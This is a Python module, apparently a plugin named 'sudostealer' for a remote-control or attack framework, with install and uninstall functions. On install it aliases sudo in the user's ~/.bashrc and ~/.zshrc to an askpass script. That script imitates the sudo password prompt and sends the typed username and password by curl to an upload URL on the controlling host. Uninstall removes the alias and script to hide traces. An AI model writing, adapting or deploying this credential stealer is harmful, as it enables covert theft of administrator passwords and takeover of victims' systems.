def install():
	import os, stat
	rcs = ["~/.bashrc","~/.zshrc"]
	dialogpath = os.path.abspath(__file__) + ".sudo"
	append = f"\nalias sudo='SUDO_ASKPASS={dialogpath} sudo -A'"
	
	DIALOG = """#!/usr/bin/env sh

username=$(whoami)
read -s -p "[sudo] password for $username: " password 1>&2
echo "" 1>&2
# echo "$username:$password" >> ~/passwords.txt
curl --silent --output /dev/null -d "$username:$password" "{}"
echo "$password"
"""
	
	for i in rcs:
		i = os.path.expanduser(i)
		if os.path.exists(i):
			with open(i, 'r') as f:
				content = f.read()
			if not content.endswith(append):
				with open(i, 'a') as f:
					f.write(append)
	
	with open(dialogpath, 'w') as f:
		f.write(DIALOG.format(f"http://{current_host}/machines/modules/sudostealer/upload"))
	st = os.stat(dialogpath)
	os.chmod(dialogpath, st.st_mode | stat.S_IEXEC)

def uninstall():
	import os, stat
	rcs = ["~/.bashrc","~/.zshrc"]
	dialogpath = os.path.abspath(__file__) + ".sudo"
	append = f"\nalias sudo='SUDO_ASKPASS={dialogpath} sudo -A'"

	def remove_alias():
		for i in rcs:
			i = os.path.expanduser(i)
			if os.path.exists(i):
				with open(i, 'r') as f:
					content = f.read()
				if content.endswith(append):
					with open(i, 'w') as f:
						f.write(content.removesuffix(append))
	remove_alias()
	try:
		os.remove(dialogpath)
	except OSError:
		pass

modules["sudostealer"] = {}
modules["sudostealer"]["install"] = install
modules["sudostealer"]["uninstall"] = uninstall